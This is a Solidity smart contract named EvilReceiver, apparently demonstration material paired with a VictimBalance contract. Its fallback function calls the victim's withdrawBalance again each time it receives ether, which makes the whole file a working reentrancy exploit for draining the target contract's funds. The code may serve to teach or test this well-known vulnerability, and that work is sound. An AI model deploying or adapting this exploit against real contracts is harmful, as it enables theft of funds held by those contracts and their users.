pragma solidity ^0.4.23;

import "./VictimBalance.sol";

contract EvilReceiver {
    VictimBalance public victimBalance;

    // the address of target contract
    address public target;

    // the event for showing the message
    event MessageLog(string);

    // the event for shiwing the balance
    event BalanceLog(uint);

    // contructor
    constructor(address _target) public {
        target = _target;
        victimBalance = VictimBalance(_target);
    }

    // the Fallback function
    function() payable public {
        emit BalanceLog(this.balance);

        // call the function withdrawBalance defined by VictimBalance
        if (!victimBalance.withdrawBalance(msg.sender)) {
            emit MessageLog("FAIL");
        }else {
            emit MessageLog("SUCCESS");
        }
    }

    // the function which is used when sending from EOA
    function addBalance() public payable {
    } 

    // the function which is used when sending to the target
    function sendEthToTarget() public {
        victimBalance.addToBalance();
    }

    // the function which is used when withdrawing from the target
    function withdraw() public {
        if (!victimBalance.withdrawBalance(target)) {
            revert();
        }
    }
}